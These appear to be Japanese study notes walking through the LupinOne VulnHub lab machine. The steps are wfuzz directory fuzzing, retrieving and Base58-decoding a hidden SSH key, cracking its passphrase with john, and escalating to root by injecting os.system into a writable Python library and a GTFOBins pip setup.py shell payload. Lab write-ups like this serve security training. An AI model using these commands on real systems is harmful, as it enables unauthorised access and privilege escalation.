## LupinOne

### ポートスキャンまで同じ
- 22,80

### robots.txtを見る
- `curl http://$IP/robots.txt` 
- ヒントは`/~myfiles`で、ディレクトリの初めに~がついていることがわかる
- ~myfilesを見ても`404 error`になる  

### 隠しディレクトリを探す
- `wfuzz -c -z file,/home/user/vulnhub/SecLists-master/Discovery/Web-Content/raft-large-directories.txt  "http://$IP/~FUZZ/"`
  - `-c`でカラー表示
  - `-z file,`は辞書の指定だが、わかりにくいので`-w`でいい
  - 初めは`--h?`をつけずに実行して関係なさそうなのを探す。ここでは404のステータスコードを返しているので`--hc 404`をつける
- これでもいける
  - `wfuzz -c -w /usr/share/wordlists/rockyou.txt -u http://$IP/~FUZZ/ --hc 404`
- 見つかったファイルは`secret` `myfiles`、時間が長いので2つ見つけたら止める
- `wfuzz -c -z file,/home/user/vulnhub/SecLists-master/Discovery/Web-Content/raft-large-directories.txt  --hc 404 "http://$IP/~FUZZ/"`
  - helpを見て`--h?`を他に行や単語数、文字数でもやってみる 

### サイトを見る
- 見つけたリンクでサイトを翻訳して確認する。分かったことがある
  - このディレクトリに秘密鍵があること
  - 秘密鍵はfasttrackで解析する
  - ユーザ名はicex64であること
 
### fasttrackとは
- 移動してみる/usr/share/wordlists/fasttrackにある辞書
- `less fasttrack.txt`中身を見るとパスワードファイルらしい
- `wc fasttrack.txt`数が少ない


### さらに隠しファイルを探すが、その前に辞書を整理する
- wfuzzの特性上`#`も200(成功)に反応するので、`#`を辞書から削除する
  - `#`はフラグメント識別子と言って、サイト内の特定の場所に移動できる  
- `grep -v '^\s*#' /usr/share/wordlists/rockyou.txt > ./custom_rockyou.txt`
  - `-v`は`'^\s*#'`以外の正規表現を抜き出す
  -  `^#`は単語の最初が#であるのを抽出
  - `\s`はスペースのことで`\s*`はスペースが０以上あるものを抽出 

### 隠しファイルを探す
- 本来は辞書のファイルを使うが、ここで欲しいのは秘密鍵のファイルで拡張子が`.txt`なので、上で作った、パスワードファイルのrockyou.txtを使う
- また隠れファイルなので頭に`.`をつける。正直、これだけのヒントでFUZZの頭にドットをつけるのに気づくのは難しいと思う
- `wfuzz -c -z file,./custom_rockyou.txt --hc 400,404 "http://$IP/~secret/.FUZZ.txt"`
  - `--hc`statusの400,404は表示させない 

### textのダウンロード
- `curl http://$IP/~secret/.mysecret.txt > .mysecret2.txt`
- または
- `curl -OL http://$IP/~secret/.mysecret.txt`
  - `-L`リダイレクト,`-O`標準出力せずにダウンロードする 
- コピーする

### ファイルを分析
- ファイルを見た感じでは秘密鍵でなく、何かしらの暗号化されているのはわかるので調べる
- `cat .mysecret2.txt | grep -o . | sort | uniq | wc`
- 58なのでBase58

### CyberChefでdecode
- CyberChefでInputでコピーをペーストする
- 一番左のsearchに`from base`と入力する。
- 青色の背景になるのでFrom base32~From base92まで順に上からドロップ&ドラッグでRecipeに置いておくとOutputに文字化けしないのを試していく。文字化けしたらゴミ箱があるのでゴミ箱を押して消して次のOperationに進んでいく
- Base58でデコード(復号)する。そして、コピーする
- `cat > key`で貼り付ける。注意するのは、ペーストしたら改行してから、`ctrl + c`で抜ける
### 秘密鍵のPermissionを変更する
- `chmod 700 key`
- `chmod 777 key`にするとsshが繋がらない。これは秘密鍵は本来、所有者しか使うことができなので当然なので、それに合わせている

### パスフレーズの解析
- (1) コマンドを使う。とても簡単これだけでもいい
  - `ssh2john key > pass.txt` 
- 暗号解析
  - `sudo john pass.txt -wordlist=/usr/share/wordlists/fasttrack.txt`
  - パスフレーズが取得できる
  - `P@55w0rd!` 

### sshでアクセス
- `ssh -i key icex64@$IP`
  - パスフレーズの入力 

### システム内の調査
- `sudo -l`
  - `(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py`
- icex64はパスワードなしでarseneとして/home/arsene/heist.pyファイルが実行できることがわかる。つまり実行することで、arseneになることができる
- heist.pyの中身を見る、これが何をしているか？
- Permissionから何がわかる？
- 本来なら、このpyファイルに書き込みたいが、できないのでwebbrowser関数の中に書き込む

### 攻撃アプローチ
- webbrowserがどこにあるか調べる
  - `locate webbrowser`
  - または
  - `find / -name '*webbrowser*' -type f -writable 2>/dev/null`
- webbrowserファイルを開く
  -  `nano /usr/lib/python3.9/webbrowser.py`
  -  import osの下に`os.system("/bin/bash")`を書き込む


### 別ユーザで権限取得
- `sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py`
  - `-u`sudoをユーザを指定して実行する 
- arseneが使えるルートコマンドを調べる
  - `sudo -l` 
- pipコマンドが使える。GTFOBinsのSudoの部分を参考にする。pipはPythonのモジュールをインストールできるコマンド。なので、架空のモジュールを作ってpipを利用する
- 一時的なディレクトリを作って、そこにルートコマンドになれるpythonのセットファイルを作る。変数の設定時にはスペースを空けてはダメ
  - `cd /tmp`
  - `TF=$(mktemp -d)`
  - `echo $TF`
  - `echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh < $(tty) > $(tty) 2> $(tty)')" > $TF/setup.py`
    - os.execl('/bin ~ $(tty)') これをシングルクォーテーションひとつで書くとエラーになる。なぜかはわからん 
  - `ls $TF`
  - `sudo pip install $TF`

### ルートフラグの取得
- ルートシェルを奪取できた
- `cd /root`
- `cat root.txt`




